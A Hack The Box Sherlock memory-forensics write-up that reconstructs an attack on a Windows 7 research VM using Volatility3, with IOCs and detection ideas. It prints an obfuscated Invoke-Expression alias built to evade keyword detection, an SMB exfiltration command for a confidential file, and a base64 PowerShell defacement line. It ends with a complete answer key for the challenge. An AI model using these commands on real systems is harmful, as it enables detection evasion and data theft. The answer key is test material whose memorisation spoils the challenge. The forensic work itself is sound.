# HTB Sherlock: Recollection — Full Writeup

**Category:** DFIR / Memory Forensics | **Platform:** Hack The Box (Sherlock) | **Difficulty:** Easy | **Solved:** September 2026

---

## TL;DR

A junior security researcher's Windows 7 test VM — used for legitimate malware research (browsing MalwareBazaar, installing a Wazuh agent) — got genuinely compromised, most likely by a sample downloaded for "safe" analysis that wasn't sandboxed. The intruder obfuscated a PowerShell alias for `Invoke-Expression` using a character-reconstruction trick to dodge keyword detection, attempted (and failed) to exfiltrate a confidential file over SMB to another host on the LAN, defaced the machine with a base64-encoded message ("hacked by mafia"), and left behind a second-stage payload disguised as a Windows system binary. The entire investigation was done from a single memory image — no disk, no PCAP, no EDR — using Volatility3 as the primary tool plus two purpose-built utilities to work around real gaps in Volatility3's Windows 7 support.

---

## Scenario

> A junior member of a security team has been performing research and testing on what's believed to be an old and insecure operating system. It may have been compromised, and a memory dump of the asset is all that's available. The task: confirm what actions were carried out by the attacker, and whether any other assets in the environment might be affected.

---

## Attack Timeline

All times UTC, reconstructed from process `CreateTime`, console buffer content, and VirusTotal metadata.

| Time (UTC) | Event | Source |
|---|---|---|
| 2022-06-22 11:49:04 | Malicious EXE compiled — PE linker timestamp | VirusTotal |
| 2022-12-19 ~14:26–14:39 | Sample first seen in the wild / first submitted to VirusTotal | VirusTotal (same day as this incident, ~1.5–2 hrs before capture) |
| 2022-12-19 15:32:28 | System boot (`System` PID 4 `CreateTime`) | `windows.pstree` |
| 2022-12-19 ~15:34 | Edge browser session starts; victim researches MalwareBazaar, downloads/extracts a sample, later searches Wazuh install steps | `windows.pstree`, browser-history string extraction |
| 2022-12-19 15:40:08 | `cmd.exe` (PID 4052) launched, spawning `conhost.exe` PID 3524 | `windows.pstree` |
| 2022-12-19 15:43:39 | `powershell.exe` (PID 3688) launched directly from `explorer.exe` — the user's normal shell session | `windows.pstree` |
| 2022-12-19 15:44:44 | Second `powershell.exe` (PID 3532) spawned as a child of the `cmd.exe` from 15:40:08 — the attacker's shell, sharing `cmd.exe`'s console/conhost | `windows.pstree`, `windows.cmdline` |
| 2022-12-19 ~15:44–15:50 | Obfuscated alias command pasted into that shell; `Invoke-Expression` aliased via character reconstruction | Console buffer recovery (`conhost.exe` PID 3524) |
| 2022-12-19 15:50:42 | `notepad.exe` (PID 3476) opens `C:\Users\Public\Secret\Confidential.txt` | `windows.pstree` |
| 2022-12-19 ~15:50+ | Attempted SMB exfil of `Confidential.txt` — failed, network path not found | Console buffer recovery |
| 2022-12-19 ~15:50+ | Base64-encoded PowerShell writes defacement message | Console buffer recovery |
| 2022-12-19 16:03:12 | `taskeng.exe` (PID 3268) fires — scheduled task trigger, timing coincides with the tail of attacker activity | `windows.pstree` |
| 2022-12-19 16:07:30 | Memory image captured | `windows.info` |

---

## Environment Details

| Fact | Value | How it was found |
|---|---|---|
| OS | Windows 7 SP1 x64, build 7601.24214 | `windows.info` (`NTBuildLab`) |
| Hostname | `USER-PC` | `windows.registry.printkey --key "ControlSet001\Control\ComputerName\ComputerName"` |
| Local IP | `192.168.0.104` | `windows.netscan` |
| Memory capture time | 2022-12-19 16:07:30 UTC | `windows.info` (`SystemTime`) |
| Local user accounts | 4 — `Administrator`, `Guest`, `HomeGroupUser$`, `user` | `windows.registry.printkey --key "SAM\Domains\Account\Users\Names"` |

---

## Methodology & Tooling

### Why Volatility3, not `bstrings`, for triage

The investigation started with `bstrings.exe` (Eric Zimmerman) against the raw 4.5 GB image, using keyword/regex search files:

```bash
bstrings.exe -f recollection.bin --fs searchStrings.txt --fr SearchRegex.txt
```

It finished in ~8.5 minutes but returned **4.4 million strings** — the search files were far too broad, and more fundamentally, `bstrings` has zero structural awareness: it treats memory as an undifferentiated byte stream with no way to tie a hit back to a specific process. Switched to Volatility3 instead, which parses actual kernel structures (EPROCESS, VAD trees, handle tables) rather than brute-force scanning:

```bash
vol -f recollection.bin windows.info
vol -f recollection.bin windows.pstree
vol -f recollection.bin windows.cmdline
vol -f recollection.bin windows.netscan
```

Each plugin handed the next one its pivot value — a PID, a timestamp, an IP. Full-image `strings`/`bstrings` searches were only used *after* vol3 narrowed the target, or as a deliberate exhaustive last resort (the final browser-history hunt, described below).

### Custom tools built during this investigation

Pushed to [`github.com/9t0wl/dfir-tools`](https://github.com/9t0wl/dfir-tools), MIT licensed, reusable beyond this box.

**`vol-triage.html`** — a single-file, no-build browser tool for `vol3 -r csv` output. Runs entirely client-side (nothing loaded into it ever leaves the browser). Auto-detects table shape from the CSV header:
- `PID` + `ImageFileName`/`Args` → process table, with a noise-hiding toggle for common system processes
- `ForeignAddr` + `State` → network table, with an external/non-listening filter and automatic **repeat-IP beacon detection** (flagged a suspicious IP appearing across three separate sockets)
- `Variable`/`Value` → parses `windows.info` into an auto-populated case bar (OS, capture time, kernel base)
- `Key`/`Name`/`Data` → registry `printkey` output, with a toggle to hide the placeholder rows every hive-scan-miss produces, plus specific recognition of the SAM account-enumeration key shape to auto-populate a user count
- Anything else loads as a plain sortable/filterable table with keyword-based flagging (LOLBins as "review," encoded-PowerShell/`Public`/`Secret`/`Temp` paths as "critical")

Click-any-PID cross-references between tabs, and multiple CSVs stay open simultaneously — built specifically because a real investigation means pivoting between several plugin outputs at once, not regenerating one static report per question.

**`strings2csv.py`** — wraps `strings` (both ASCII and UTF-16LE passes) into a `PID,Encoding,Offset,String` CSV loadable the same way:

```bash
python3 strings2csv.py DUMP [--pid PID] [--min-len N] [--pattern REGEX]
```

Built because `windows.consoles`/`windows.cmdscan` raise `NotImplementedError` on Windows 7 in this vol3 version — those plugins hard-code which Windows versions they can parse conhost's console buffer for, and Win7 isn't on the list. The fallback: dump the owning `conhost.exe` process and grep its memory by hand in both encodings, then load the result the same way as any vol3 export. Also works directly against the full raw image (not just per-process dumps), which is what made the final browser-history hunt possible.

---

## Investigation — Every Task, Every Command

### Task 1 — Operating System
**Answer: Windows 7**
```bash
vol -f recollection.bin windows.info
```
`NTBuildLab: 7601.24214.amd64fre.win7sp1_ldr_`, `NtMajorVersion: 6`, `NtMinorVersion: 1`, `Is64Bit: True` all confirm Windows 7 SP1 x64.

### Task 2 — Memory Dump Creation Time
**Answer: 2022-12-19 16:07:30**

Same `windows.info` output, field `SystemTime: 2022-12-19 16:07:30+00:00`.

### Task 3 — Obfuscated PowerShell Command Copied to Clipboard
**Answer:**
```
(gv '*MDR*').naMe[3,11,2]-joIN''
```

`windows.consoles`/`windows.cmdscan` both failed outright:
```bash
vol -f recollection.bin windows.consoles
# NotImplementedError: This version of Windows is not supported: 6.1 15.7601!
```

The fallback: match `conhost.exe`'s process-creation timestamp against the shell it belongs to. `conhost.exe` PID 3524's `CreateTime` (15:40:08) matched `cmd.exe` PID 4052's `CreateTime` exactly — a PowerShell spawned from an existing `cmd.exe` window generally reuses that shell's console rather than getting its own.

```bash
vol -f recollection.bin windows.memmap --dump --pid 3524
python3 strings2csv.py pid.3524.dmp --pid 3524 \
  --pattern 'iex|invoke-expression|frombase64|alias|-enc' > console_3524.csv
```

951 rows came back, mostly ASCII false positives from legitimate Windows console API export names (`AddConsoleAliasA`, `GetConsoleAliasW`, etc. — every process linking `kernel32.dll` has these resident as strings). Filtering to `UTF16LE` only in the loaded CSV (real typed/pasted console text is stored UTF-16LE; the API-name noise is ASCII) isolated a single real hit: a full console screen buffer scrape at offset `0x34160`.

### Task 4 — Cmdlet the Obfuscated Command Aliases
**Answer: `Invoke-Expression`**

`gv` is the built-in alias for `Get-Variable`. `'*MDR*'` wildcard-matches exactly one automatic variable: `$MaximumDriveCount` — the only built-in variable containing "MDR". `.naMe` returns its name as the string `"MaximumDriveCount"`. Indexing that string at positions `[3,11,2]`:

```
M a x i m u m D r i  v  e  C  o  u  n  t
0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16
```

→ index 3 = `i`, index 11 = `e`, index 2 = `x` → `"iex"` (the built-in alias for `Invoke-Expression`), joined via `-joIN''`. The result: the alias `iex` gets reconstructed at runtime without the literal text `iex` or `Invoke-Expression` ever appearing in the command — a real technique for dodging naive string/signature-based detection on those exact keywords.

### Task 5 — Full CMD Exfiltration Command
**Answer:**
```
type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171\pulice\pass.txt
```

Same console buffer scrape from Task 3/4 — one buffer answered four tasks at once. `192.168.0.171` is a different host on the same `/24` as the compromised machine (`192.168.0.104`), and share name `pulice`.

### Task 6 — Was the File Exfiltrated Successfully?
**Answer: NO**

Failed immediately: `"The network path was not found"`, followed by a PowerShell `IOException`/`FileOpenFailure`.

### Task 7 — Defacement Readme Full Path
**Answer:**
```
C:\Users\Public\Office\readme.txt
```

Same buffer contained: `powershell -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"`. Base64-decoded (independently cross-checked in CyberChef, not taken on faith from a single decode):
```bash
echo "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi" | base64 -d
# echo "hacked by mafia" > "C:\Users\Public\Office\readme.txt"
```

### Task 8 — Host Name
**Answer: `USER-PC`**

Not exposed by `windows.info` — pulled from the registry instead:
```bash
vol -f recollection.bin windows.registry.printkey --key "Select"
# find the "Current" value, e.g. Current = 1 -> ControlSet001
vol -f recollection.bin -r csv windows.registry.printkey \
  --key "ControlSet001\Control\ComputerName\ComputerName" > computername.csv
```

### Task 9 — Number of User Accounts
**Answer: 4** (`Administrator`, `Guest`, `HomeGroupUser$`, `user`)

```bash
vol -f recollection.bin -r csv windows.registry.printkey \
  --key "SAM\Domains\Account\Users\Names" > sam_users.csv
```

17 total rows returned; 12 were hive-scan-miss placeholders — `printkey` re-scans *every* loaded hive for the relative key path given, and every hive that doesn't actually have it comes back with `Name`/`Data` == `-`. Only the real SAM hive's rows carried actual account names, plus the always-present, non-account `(Default)` value.

### Task 10 — `passwords.txt` Full Path
**Answer:**
```
\Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\passwords.txt
```

```bash
vol -f recollection.bin -r csv windows.filescan > filescan.csv
```

4707 rows total; filtering the loaded CSV to `pas` found it cleanly, plus a bonus artifact, `\Windows\debug\PASSWD.LOG` (a legitimate Windows SAM debug log). Worth noting: `ZxcvbnData` is Chromium/Edge's own bundled password-strength-estimation library — this `passwords.txt` is very likely a benign wordlist the browser ships with, not attacker-planted credential material.

### Task 11 — Malicious Executable's Self-Hash Filename
**Answer:**
```
b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1
```
(SHA256 — 64 hex characters)

Found by filtering the already-loaded `filescan.csv` to `.exe`: `\Users\user\Downloads\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe` (a matching `.zip` of the same hash also present, consistent with a MalwareBazaar-style download-and-extract).

**Recovering the actual bytes hit a real dead end:**
```bash
vol -f recollection.bin windows.dumpfiles --virtaddr 0x11fa45c20
# Cache   FileObject      FileName        Result
# (empty — no rows, no error)
```
No error, just an empty result table. That means the `_FILE_OBJECT` was captured (proving the file was referenced), but its data/image section wasn't resident in memory at capture time — nothing left to carve.

**The fix: pivot the hash to VirusTotal instead of carving from memory.** It was already a known, publicly flagged sample — 61 of 71 vendors.

### Task 12 — Imphash
**Answer: `d3b592cd9481e4f053b5362e22d61595`**

Pulled directly from VirusTotal's Basic Properties for that SHA256 — no memory carving needed once the hash was in hand.

### Task 13 — Malicious File Creation Date (UTC)
**Answer: `2022-06-22 11:49:04 UTC`**

VirusTotal's "History" → "Creation Time" field (PE linker timestamp, already shown in UTC).

**Notable correlation:** VirusTotal's "First Seen In The Wild" (`2022-12-19 14:26:43 UTC`) and "First Submission" (`2022-12-19 14:39:42 UTC`) are the *same calendar day* as this memory capture (`16:07:30 UTC`) — roughly 1.5–2 hours earlier. This sample became publicly visible on VirusTotal right around when this incident happened.

### Task 14 — Local IP Address
**Answer: `192.168.0.104`**
```bash
vol -f recollection.bin windows.netscan
```

### Task 15 — Parent of the Second PowerShell Process
**Answer: `cmd.exe`**

Two PowerShell processes existed: PID 3688 (spawned directly by `explorer.exe`, the normal interactive session) and PID 3532 (spawned by `cmd.exe` PID 4052) — the second one is the attacker's shell, confirmed via `windows.pstree`.

### Task 16 — Attacker's Email Address
**Answer: `mafia_code1337@gmail.com`**

```bash
python3 strings2csv.py recollection.bin \
  --pattern 'siem|[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,4}' \
  --min-len 6 > browser_leads.csv
```
898 rows; the email appeared repeatedly, directly adjacent to `facebook.com` login-form remnants in memory. The "mafia" naming matches the `readme.txt` defacement string exactly — very likely the attacker's own account.

### Task 17 — SIEM Solution Researched
**Answer: `Wazuh`**

Filtering `browser_leads.csv` for the literal word `siem` came up empty — nobody searches "best SIEM," they search the product by name — so a broader search-URL extraction ran instead:
```bash
python3 strings2csv.py recollection.bin \
  --pattern 'search\?q=|bing\.com|google\.com/search' \
  --min-len 8 > search_urls.csv
```
15,578 rows — mostly the same handful of queries duplicated across memory (browser cache, DOM copies, working-set duplicates). Deduplicated at the command line instead of scrolling a haystack:
```bash
grep -oE 'q=[^&]*' search_urls.csv | sort | uniq -c | sort -rn
```
Top result after the noise (7-Zip installs, base64-encoding lookups): `q=install+wazuh+agent+windows` (44 hits).

### Task 18 — Typosquatted Malware Filename
**Answer: `csrsss.exe`**

A doubled-letter typosquat of the legitimate `csrss.exe` (Client/Server Runtime Subsystem). Found by re-filtering `filescan.csv` (already loaded) for `shall`/`shell`-style typo candidates and scanning the `.exe` entries in `\Users\user\Downloads\` — same technique that found the hash-named exe in Task 11, applied a second time. Sitting alongside it in the same folder: BITS transfer artifacts (`qmgr0.dat`/`qmgr1.dat`), suggesting a background-download mechanism rather than a direct browser save for this second payload.

---

## The Full Story

The victim machine wasn't a random target — it was a Windows 7 VM being used *deliberately* for security research. Browser history recovered from memory shows searches for `malwarebazaar`, `exploit-db`, `exploit.in`, and `install wazuh agent windows` — a researcher pulling malware samples for analysis and standing up a SIEM agent to monitor for exactly this kind of activity. MalwareBazaar's own convention is to name downloaded samples after their SHA256 hash — precisely the naming pattern found on the malicious executable later recovered from Downloads. The likely read: the researcher pulled a "safe to analyze" sample and it wasn't actually sandboxed — it ran, for real, on a machine with live network access to the rest of the environment.

Once active, the attacker (or the researcher's own downloaded sample, acting maliciously) opened a `cmd.exe` session that spawned a **second, separate PowerShell process** distinct from the user's own interactive session. Into that shell went the obfuscated alias command, then a targeted look at `Confidential.txt` (opened first in Notepad, presumably to confirm it was worth taking), then a failed SMB exfiltration attempt, then a base64-encoded defacement message.

A genuinely interesting attribution thread ties it together: an email address (`mafia_code1337@gmail.com`) recovered from browser memory sits directly next to Facebook login-form remnants, and its naming matches the "hacked by mafia" defacement message almost exactly — very likely the attacker's own account, used to log into a social platform from the compromised machine itself.

A second file, `csrsss.exe` — a typosquat of the legitimate `csrss.exe` — was also found in Downloads, alongside BITS transfer artifacts, suggesting a second payload staged via a background download rather than a direct browser save. This file's own hash was never separately checked in this investigation, unlike the primary sample.

---

## Indicators of Compromise

| Type | Value | Notes |
|---|---|---|
| SHA256 | `b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1` | Malicious EXE, 61/71 VT detections |
| MD5 | `a30321ef61b1ffedb24adeb49cc8ef9c` | Same sample |
| SHA1 | `d4702c8d69901b7a3bce553921d6f1488ee177d9` | Same sample |
| Imphash | `d3b592cd9481e4f053b5362e22d61595` | Same sample |
| File path | `C:\Users\user\Downloads\b0ad7041...02635cb1.exe` (+ matching `.zip`) | Downloaded, likely from MalwareBazaar |
| File path | `C:\Users\user\Downloads\csrsss.exe` | Typosquat of `csrss.exe`; own hash not determined in this investigation |
| Behavioral IOC | `(gv '*MDR*').naMe[3,11,2]-joIN''` | Obfuscated `Invoke-Expression` alias construction |
| Attacker email | `mafia_code1337@gmail.com` | Recovered from Facebook login-form remnants in browser memory |
| Defaced file | `C:\Users\Public\Office\readme.txt` (`"hacked by mafia"`) | Written via base64-encoded PowerShell |
| Attempted exfil target | `192.168.0.171` (SMB share `pulice`) | Attempt failed — worth checking independently across the environment |
| Targeted file | `C:\Users\Public\Secret\Confidential.txt` | Opened in Notepad, then exfil-attempted |
| Repeat-connection IP | `198.144.120.23` (ports 80/443) | Flagged by a repeat-IP heuristic in `vol-triage.html`; never confirmed against a specific task |
| Compromised host | `USER-PC` / `192.168.0.104` | |

---

## Key Takeaways

- **`bstrings`/full-image `strings` is not a triage tool.** It has no structural awareness and returns everything, filtered or not. Use vol3 first to get a specific PID/lead, then scope a string search to just that process's dumped memory — or, as the final task proved, the full image *with a precise pattern* once you know exactly what you're looking for.
- **vol3 plugins aren't universally OS-compatible.** `windows.consoles`/`windows.cmdscan` hard-code supported Windows versions and simply refuse to run outside that list. Not a bug in the investigation — a real gap to work around, and it recurs on any pre-Win10 image.
- **`conhost.exe` owns the console buffer, not the shell process itself.** When a console-parsing plugin fails, dump `conhost.exe` (matched to the shell via `CreateTime` correlation in `pstree`), not the shell's own memory.
- **Broad keyword searches on raw strings drown in false positives from legitimate API export names.** Filtering by encoding (UTF-16LE for real typed/pasted text vs. ASCII for binary/API-name noise) or tightening the pattern to actual syntax cuts through it fast.
- **PowerShell obfuscation doesn't require encoding — string reconstruction from unrelated data works too.** `Get-Variable` wildcard matching plus character-index-and-join builds a sensitive keyword (`iex`) at runtime that never appears as a literal in the command line.
- **`windows.registry.printkey` re-scans every loaded hive for the relative key path given, not just the one that has it.** Most rows in any `printkey` CSV are placeholder misses — real data is the minority.
- **`EPROCESS.ImageFileName` is capped at 15 characters.** A process running from a long filename (a 64-char hash-named EXE) shows up truncated or unrecognizable in `pstree`/`cmdline` — exactly why this malware never stood out among the tracked processes and had to be found via `filescan` instead.
- **`windows.dumpfiles` returning an empty result table (no error) means the `_FILE_OBJECT` was found but its data section wasn't memory-resident.** The file's existence got captured, its content didn't. Not every artifact `filescan` finds is actually carvable.
- **A file hash is a pivot, not a dead end**, even when the underlying bytes can't be carved. VirusTotal supplied Imphash, PE compile timestamp, and first-seen-in-the-wild timestamps that correlated directly with the incident timeline — without needing the file bytes at all.
- **Large result sets should be deduplicated at the command line before they're read.** 15,578 rows collapsed to a short, scannable list with `grep -oE 'q=[^&]*' | sort | uniq -c | sort -rn`.
- **Independently re-verify a decoded artifact when it matters.** The base64-decoded `readme.txt` path was cross-checked in a second tool (CyberChef) rather than trusted on a single decode.

---

## Detection Opportunities

- Alert on a `cmd.exe`/`powershell.exe` child process chain that coexists with a user's own normal interactive shell session — the anomaly is in the ancestry, not the process name.
- Don't rely on keyword/signature detection for `iex`/`Invoke-Expression` alone — this box demonstrates a trivial technique for constructing that string at runtime from unrelated data.
- Treat SMB write attempts to an unfamiliar internal host as a detectable event on their own, independent of whether the transfer actually succeeds.
- Flag base64-encoded PowerShell one-liners that write to world-writable paths (`C:\Users\Public\...`) — legitimate administrative activity rarely takes this shape.
- Hash-allowlist known Windows system binary names and flag any executable in a user-writable location (Downloads, Temp, AppData) matching one by name but not by hash — the cheapest possible catch for a typosquatted system-process name.
- A file hash is a pivot even without the bytes: check known-hash-lookup services first before assuming a sample requires full local analysis.
- Sandbox discipline matters for security researchers themselves — a sample pulled from a public malware repository for "safe" analysis is still live malware, and this case is a reasonable argument for why that analysis never happens on a machine with real network access to anything else.

---

## Tools Built During This Investigation

Both pushed to [`github.com/9t0wl/dfir-tools`](https://github.com/9t0wl/dfir-tools), MIT licensed:
- **`vol-triage.html`** — browser-based Volatility3 CSV triage tool (auto-detecting process/network/registry/info table shapes, PID cross-referencing, keyword + repeat-IP flagging)
- **`strings2csv.py`** — converts `strings` output (both encodings) into a CSV loadable by the above, for cases where a vol3 plugin doesn't support the target OS version

---

## Quick Answer Reference

| # | Question | Answer |
|---|---|---|
| 1 | Operating System | Windows 7 |
| 2 | Memory dump creation time | 2022-12-19 16:07:30 |
| 3 | Obfuscated PowerShell command | `(gv '*MDR*').naMe[3,11,2]-joIN''` |
| 4 | Cmdlet aliased | Invoke-Expression |
| 5 | CMD exfil command | `type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171\pulice\pass.txt` |
| 6 | Exfil successful? | NO |
| 7 | Readme file path | `C:\Users\Public\Office\readme.txt` |
| 8 | Host Name | USER-PC |
| 9 | Number of user accounts | 4 |
| 10 | `passwords.txt` path | `\Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\passwords.txt` |
| 11 | Malicious EXE hash (SHA256) | `b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1` |
| 12 | Imphash | `d3b592cd9481e4f053b5362e22d61595` |
| 13 | Malicious file creation date | 2022-06-22 11:49:04 |
| 14 | Local IP address | 192.168.0.104 |
| 15 | Parent of second PowerShell | cmd.exe |
| 16 | Attacker's email address | mafia_code1337@gmail.com |
| 17 | SIEM solution researched | Wazuh |
| 18 | Typosquatted malware filename | csrsss.exe |
